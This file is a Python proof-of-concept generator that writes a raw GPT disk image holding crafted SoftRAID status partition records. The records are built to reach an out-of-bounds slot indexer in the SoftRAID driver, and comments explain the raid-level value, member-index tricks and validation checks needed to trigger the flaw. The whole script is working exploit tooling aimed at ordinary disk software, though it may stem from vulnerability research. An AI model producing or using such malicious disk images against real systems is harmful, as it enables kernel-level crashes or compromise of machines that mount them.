#!/usr/bin/env python3
import struct
import uuid
import zlib

SECTOR = 512
IMG_SIZE = 64 * 1024 * 1024
LAST_LBA = IMG_SIZE // SECTOR - 1

GPT_ENTRY_COUNT = 128
GPT_ENTRY_SIZE = 128
GPT_ENTRY_BYTES = GPT_ENTRY_COUNT * GPT_ENTRY_SIZE
GPT_ENTRY_SECTORS = GPT_ENTRY_BYTES // SECTOR
GPT_PRIMARY_ENTRIES_LBA = 2
GPT_BACKUP_ENTRIES_LBA = LAST_LBA - GPT_ENTRY_SECTORS
FIRST_USABLE_LBA = 34
LAST_USABLE_LBA = GPT_BACKUP_ENTRIES_LBA - 1

STATUS_LBA = 2048
STATUS_SIZE = 0x237000
STATUS_SECTORS = STATUS_SIZE // SECTOR
STATUS_LAST_LBA = STATUS_LBA + STATUS_SECTORS - 1

VOLUME_LBA = 8192
VOLUME_SECTORS = 16384
VOLUME_LAST_LBA = VOLUME_LBA + VOLUME_SECTORS - 1

STATUS_TYPE = "B6FA30DA-92D2-4A9A-96F1-871EC6486200"
VOLUME_TYPE = "FA709C7E-65B1-4593-BFD5-E71D61DE9B02"
DISK_GUID = "11111111-2222-3333-4444-555555555555"
STATUS_GUID = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0001"
VOLUME_GUID = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0002"

import os as _os
DISK_STATUS_ID = int(_os.environ.get("SR_DISK_ID", "0x1111222233334444"), 0)
VOL_SLOT1_ID = int(_os.environ.get("SR_VOL_ID", "0x5151515151510001"), 0)
VOL_SLOT2_ID = VOL_SLOT1_ID

# SoftRAID indexes the volume class table with raid_level + 1.
# 0xffffffff selects VolumeNonRAID, which is the single-member path.
NONRAID_LEVEL = 0xFFFFFFFF
SLOT2_MEMBER_INDEX = int(_os.environ.get("SR_MEMBER_INDEX", "0"), 0)
SLOT2_MEMBER_COUNT = int(_os.environ.get("SR_MEMBER_COUNT", "1"), 0)

OUT = _os.environ.get("SR_OUT", "softraid_poc.raw")


def le_guid(s: str) -> bytes:
    return uuid.UUID(s).bytes_le


def utf16le_name(s: str) -> bytes:
    raw = s.encode("utf-16le")
    if len(raw) > 72:
        raise ValueError("GPT name too long")
    return raw + b"\x00" * (72 - len(raw))


def gpt_entry(type_guid: str, unique_guid: str, first: int, last: int, name: str) -> bytes:
    return (
        le_guid(type_guid)
        + le_guid(unique_guid)
        + struct.pack("<QQQ", first, last, 0)
        + utf16le_name(name)
    )


def gpt_header(current_lba: int, backup_lba: int, entries_lba: int, entry_crc: int) -> bytes:
    header_size = 92
    header = bytearray(SECTOR)
    struct.pack_into(
        "<8sIIIIQQQQ16sQIII",
        header,
        0,
        b"EFI PART",
        0x00010000,
        header_size,
        0,
        0,
        current_lba,
        backup_lba,
        FIRST_USABLE_LBA,
        LAST_USABLE_LBA,
        le_guid(DISK_GUID),
        entries_lba,
        GPT_ENTRY_COUNT,
        GPT_ENTRY_SIZE,
        entry_crc,
    )
    crc = zlib.crc32(header[:header_size]) & 0xFFFFFFFF
    struct.pack_into("<I", header, 16, crc)
    return bytes(header)


def be16(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into(">H", buf, off, value & 0xFFFF)


def be32(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into(">I", buf, off, value & 0xFFFFFFFF)


def be64(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into(">Q", buf, off, value & 0xFFFFFFFFFFFFFFFF)


def put_volume_partition_status_rec(
    status: bytearray,
    base: int,
    volume_id: int,
    member_index: int,
    member_count: int,
    raid_level: int = NONRAID_LEVEL,
    volume_size: int = VOLUME_SECTORS * SECTOR,
) -> None:
    be64(status, base + 0x00, volume_id)
    be64(status, base + 0x08, 0)
    be32(status, base + 0x10, raid_level)
    be32(status, base + 0x14, 0)
    be64(status, base + 0x18, volume_size)
    be32(status, base + 0x20, 0)
    be64(status, base + 0x24, volume_size)
    be32(status, base + 0x34, raid_level)
    be32(status, base + 0x38, 0)
    status[base + 0x6C] = member_index & 0xFF
    status[base + 0x6E] = member_count & 0xFF
    be32(status, base + 0x80, int(_os.environ.get("SR_BLKSIZE", "0x4000"), 0))  # slot+0x80 block size; ValidateDiskStatusRec requires {0x4000,0x8000,0x10000,0x20000,0x40000,0x100000}
    be16(status, base + 0x84, 0)
    be32(status, base + 0x88, 0)
    be64(status, base + 0x8C, 0)
    be32(status, base + 0x94, 0)
    be32(status, base + 0xA4, 0x4000)
    be32(status, base + 0xCC, 0)


def build_status_partition() -> bytes:
    status = bytearray(STATUS_SIZE)

    be32(status, 0x00, 3)
    be32(status, 0x04, 0)
    be64(status, 0x08, DISK_STATUS_ID)
    be64(status, 0x10, 0)
    be64(status, 0x18, 0)
    be32(status, 0x20, 1)

    slot1 = 0x24
    slot2 = 0x24 + 0xD0
    put_volume_partition_status_rec(status, slot1, VOL_SLOT1_ID, 0, 1)
    # The 0xff OOB variant reaches the unbounded slot indexer, but it cannot
    # satisfy the initial all-members-online gate for a one-member volume.
    put_volume_partition_status_rec(status, slot2, VOL_SLOT2_ID, SLOT2_MEMBER_INDEX, SLOT2_MEMBER_COUNT)

    status[0x3600:0x6C00] = status[0:0x3600]

    ext = 0x6C00
    be32(status, ext + 0x00, 3)
    be32(status, ext + 0x04, 0)
    be64(status, ext + 0x08, DISK_STATUS_ID)
    be32(status, ext + 0x34, 0)

    ext_slot1 = ext + 0x200
    ext_slot2 = ext + 0x200 + 0x4600
    be64(status, ext_slot1 + 0x00, VOL_SLOT1_ID)
    be64(status, ext_slot2 + 0x00, VOL_SLOT2_ID)

    return bytes(status)


def build_volume_partition() -> bytes:
    # SoftRAID routes volume providers from IOMedia properties + the status
    # table. Disk::AddProvider does not read a volume-sector header before
    # calling Disk::AddVolumePartition, so the s2 content is intentionally zero.
    return b"\x00" * (VOLUME_SECTORS * SECTOR)


def assert_soft_raid_trigger_bytes(img: bytearray) -> None:
    status_off = STATUS_LBA * SECTOR
    slot1 = status_off + 0x24
    slot2 = status_off + 0x24 + 0xD0
    ext = status_off + 0x6C00
    ext_slot1 = ext + 0x200
    ext_slot2 = ext + 0x200 + 0x4600
    volume_off = VOLUME_LBA * SECTOR

    assert img[slot1:slot1 + 8] == struct.pack(">Q", VOL_SLOT1_ID)
    assert img[slot1 + 0x10:slot1 + 0x14] == struct.pack(">I", NONRAID_LEVEL)
    assert img[slot1 + 0x6C] == 0
    assert img[slot1 + 0x6E] == 1

    assert img[slot2:slot2 + 8] == struct.pack(">Q", VOL_SLOT2_ID)
    assert img[slot2 + 0x10:slot2 + 0x14] == struct.pack(">I", NONRAID_LEVEL)
    assert img[slot2 + 0x6C] == (SLOT2_MEMBER_INDEX & 0xFF)
    assert img[slot2 + 0x6E] == (SLOT2_MEMBER_COUNT & 0xFF)

    assert img[ext_slot1:ext_slot1 + 8] == struct.pack(">Q", VOL_SLOT1_ID)
    assert img[ext_slot2:ext_slot2 + 8] == struct.pack(">Q", VOL_SLOT2_ID)
    assert img[volume_off:volume_off + VOLUME_SECTORS * SECTOR] == build_volume_partition()


def main() -> None:
    if STATUS_SIZE % SECTOR:
        raise ValueError("status partition size must be sector aligned")
    if not (STATUS_LAST_LBA < VOLUME_LBA <= VOLUME_LAST_LBA < LAST_USABLE_LBA):
        raise ValueError("partition layout overlap")

    img = bytearray(IMG_SIZE)

    # Protective MBR.
    struct.pack_into("<B3sB3sII", img, 0x1BE, 0, b"\x00\x02\x00", 0xEE, b"\xFF\xFF\xFF", 1, min(LAST_LBA, 0xFFFFFFFF))
    img[0x1FE:0x200] = b"\x55\xAA"

    entries = bytearray(GPT_ENTRY_BYTES)
    entries[0:128] = gpt_entry(
        STATUS_TYPE,
        STATUS_GUID,
        STATUS_LBA,
        STATUS_LAST_LBA,
        "Apple_Boot_SoftRAID_Status",
    )
    entries[128:256] = gpt_entry(
        VOLUME_TYPE,
        VOLUME_GUID,
        VOLUME_LBA,
        VOLUME_LAST_LBA,
        "Apple_Boot_SoftRAID_Volume",
    )
    entry_crc = zlib.crc32(entries) & 0xFFFFFFFF

    img[SECTOR:2 * SECTOR] = gpt_header(1, LAST_LBA, GPT_PRIMARY_ENTRIES_LBA, entry_crc)
    pentry_off = GPT_PRIMARY_ENTRIES_LBA * SECTOR
    img[pentry_off:pentry_off + GPT_ENTRY_BYTES] = entries

    bentry_off = GPT_BACKUP_ENTRIES_LBA * SECTOR
    img[bentry_off:bentry_off + GPT_ENTRY_BYTES] = entries
    img[LAST_LBA * SECTOR:(LAST_LBA + 1) * SECTOR] = gpt_header(
        LAST_LBA,
        1,
        GPT_BACKUP_ENTRIES_LBA,
        entry_crc,
    )

    status_off = STATUS_LBA * SECTOR
    img[status_off:status_off + STATUS_SIZE] = build_status_partition()

    volume_off = VOLUME_LBA * SECTOR
    volume = build_volume_partition()
    img[volume_off:volume_off + len(volume)] = volume

    assert_soft_raid_trigger_bytes(img)

    with open(OUT, "wb") as f:
        f.write(img)

    print(f"wrote {OUT} ({IMG_SIZE:#x} bytes)")
    print(f"status partition: LBA {STATUS_LBA}..{STATUS_LAST_LBA}, file offset {status_off:#x}, size {STATUS_SIZE:#x}")
    print(f"volume partition: LBA {VOLUME_LBA}..{VOLUME_LAST_LBA}, file offset {VOLUME_LBA * SECTOR:#x}")
    print(f"slot2 base: file offset {status_off + 0x24 + 0xD0:#x}")
    print(f"slot2 member index byte: file offset {status_off + 0x24 + 0xD0 + 0x6C:#x}, value {SLOT2_MEMBER_INDEX:#x}")
    print(f"extended slot2 base: file offset {status_off + 0x6C00 + 0x200 + 0x4600:#x}")


if __name__ == "__main__":
    main()
